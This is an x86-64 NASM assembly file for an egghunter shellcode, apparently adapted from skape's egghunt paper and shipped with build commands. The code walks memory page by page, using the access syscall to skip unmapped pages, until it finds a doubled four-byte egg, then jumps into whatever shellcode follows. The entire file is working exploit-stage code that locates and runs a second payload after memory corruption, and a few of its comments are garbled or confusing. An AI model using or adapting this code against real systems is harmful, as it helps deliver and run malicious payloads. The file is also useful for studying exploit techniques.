; David @InfinitelyManic
; code derived from http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf 
; nasm -felf64 -g -F dwarf egghunter.s -o egghunter.o && ld egghunter.o -o egghunter
; 
section .text
	global _start
_start:
	xor edx, edx
	mov edx, 0x00600000		; estimate of starting location of egg
L0:
	or dx, 0xfff			; prep 4096 PAGE_SIZE boundary - no nulls
L1:
	inc edx				; 0x...1000 = 4096 PAGE_SIZE, 0x1000++
	lea rdi, [edx+0x4]		; get instructions following egg 
	; rsi				; mode accessibility check is = F_OK ; assumes rsi = 0
					; │#  define F_OK  0   /* Test for existence.  */
	push byte 21			; 0x21 for 32-bit syscall; don't get it confused 
	pop rax				; access syscall 
	syscall 
	cmp al, 0xf2			; ENOET ?
	jz L0				; inc by PAGE_SIZE ENOENT
_egg:
	mov eax, 0x50905090		; egg - NOP slide
	mov edi, edx			; scas base - pointer address 

	scasd				; search for egg in egghunter  then inc 4 bytes
	jnz L1				; if egg not found then inc addr one byte 
	scasd				; search for the egg in egg PROG then inc 4 bytes
	jnz L1				; if egg not found then advance addr one byte 

	jmp rdi				; egg found, 8 bytes are skipped, execute shellcode
